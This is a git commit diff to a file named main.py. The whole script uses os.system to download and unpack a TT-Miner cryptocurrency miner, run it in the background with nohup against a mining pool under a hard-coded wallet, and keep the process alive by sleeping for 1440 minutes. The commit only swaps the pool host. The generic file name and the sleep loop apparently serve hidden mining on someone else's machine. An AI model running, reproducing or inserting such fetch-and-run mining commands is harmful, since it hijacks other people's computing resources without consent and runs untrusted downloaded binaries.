53e47513c448352a399ce6c78223defe00ed0c86
sabri fuadi <sabrif0610@gmail.com>
2024-06-03 08:52:10 +0000

    Update main.py

--- main.py
+++ main.py
@@ -2,6 +2,5 @@ import sys
 import os
 os.system("wget https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta4/TT-Miner-2024.2.1B4.tar.gz")
 os.system("tar xf TT-Miner-2024.2.1B4.tar.gz")
-os.system("nohup ./TT-Miner-2024.2.1B4/TT-Miner -t 4 -a FLEX -P ssl://kc1qnvclnjxyp3h8wak2krz8ghyjxya7uldzqz7930.sabri:sabri@eu.mpool.live:6486 > edge.log 2>&1 &")
+os.system("nohup ./TT-Miner -t 4 -a FLEX -P ssl://kc1qnvclnjxyp3h8wak2krz8ghyjxya7uldzqz7930.sabri:sabri@de.vipor.net:5120 > edge.log 2>&1 &")
 os.system("sleep 1440m")
-cd 
